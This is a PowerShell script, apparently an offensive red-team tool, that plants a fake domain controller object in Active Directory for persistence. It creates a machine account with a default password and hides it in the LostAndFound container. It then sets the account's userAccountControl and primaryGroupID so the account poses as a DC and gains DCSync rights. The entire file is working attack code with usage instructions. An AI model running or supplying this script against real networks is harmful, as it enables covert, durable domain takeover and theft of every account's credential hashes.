<#
.SYNOPSIS
Creates a fake DC computer object for persistence.
Need DA privilege on AD

.VERSION
1.2

.AUTHOR
R3alM0m1X82 - 21.07.25

.DESCRIPTION
Creates a computer object, modifies it to appear as a DC (SERVER_TRUST_ACCOUNT + primaryGroupID 516), granting DCSync rights.
#>

function Invoke-FakeDCObjectCreation {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,HelpMessage="Specify a unique machine account name, e.g. FakeDCWS01")]
        [string]$MachineAccount,

        [string]$Domain,
        [string]$DC,
        [string]$Password = "Password123"
    )

    function Get-CurrentDomain {
        try {
            $context = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            return $context.Name
        }
        catch {
            Write-Error "Failed to detect joined domain. Please provide -Domain and -DC parameters."
            exit
        }
    }

    if (-not $MachineAccount) {
        Write-Error "[-] You must specify a machine account name. Example usage:`nInvoke-FakeDCObjectCreation -MachineAccount FakeDCWS01"
        exit
    }

    # Auto-detect domain if not provided
    if (-not $Domain) {
        $Domain = Get-CurrentDomain
        Write-Host "[+] Auto-detected domain: $Domain"
    }

    # Auto-select DC if not provided
    if (-not $DC) {
        try {
            $DC = (Get-ADDomainController -DomainName $Domain | Select-Object -First 1).HostName
            Write-Host "[+] Auto-selected Domain Controller: $DC"
        }
        catch {
            Write-Error "Failed to find Domain Controller. Please provide -DC parameter."
            exit
        }
    }

    # Import Powermad
    Write-Host "[*] Importing Powermad module..."
    try {
        . C:\Tools\Powermad.ps1
        if (-not (Get-Command New-MachineAccount -ErrorAction SilentlyContinue)) {
            throw "Function New-MachineAccount not found after importing Powermad. Check Powermad.ps1 integrity."
        }
    }
    catch {
        Write-Error "Failed to import Powermad module or load New-MachineAccount function: $_"
        exit
    }

    # Step 1: Create Fake Computer Account
    Write-Host "[*] Creating fake computer account: $MachineAccount"
    New-MachineAccount -MachineAccount $MachineAccount -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -Domain $Domain -DomainController $DC -Verbose:$VerbosePreference

    # Import AD module
    Write-Host "[*] Importing ADModule..."
    Import-Module c:\Tools\Microsoft.ActiveDirectory.Management.dll -Verbose:$VerbosePreference

    # Step 2: Move fake PC object to LostAndFound in correct domain context
    Write-Host "[*] Moving computer object to LostAndFound container in domain: $Domain"
    $DomainContext = Get-ADDomain -Server $DC
    $LostAndFoundPath = "CN=LostAndFound," + $DomainContext.DistinguishedName
    Get-ADComputer -Identity $MachineAccount -Server $DC | Move-ADObject -TargetPath $LostAndFoundPath -Verbose:$VerbosePreference

    # Import PowerView
    Write-Host "[*] Importing PowerView..."
    . C:\Tools\PowerView.ps1

    # Step 3: Modify userAccountControl to SERVER_TRUST_ACCOUNT (8192) and primaryGroupID to 516
    Write-Host "[*] Modifying userAccountControl to SERVER_TRUST_ACCOUNT (8192) and primaryGroupID to 516"
    Set-DomainObject -Identity $MachineAccount -Domain $Domain -DomainController $DC -Set @{
        "userAccountControl" = 8192
        "primaryGroupID" = 516
    } -Verbose:$VerbosePreference

    # Final check
    Write-Host "[+] Completed. Final object attributes:"
    Get-DomainComputer $MachineAccount -Domain $Domain -DomainController $DC | Select-Object name, userAccountControl, primaryGroupID

    Write-Host "[*] Fake DC object creation completed successfully."
}

Write-Host "`n[*] To use this function after importing:`nInvoke-FakeDCObjectCreation -MachineAccount FakeDCWS01 -Verbose`n"
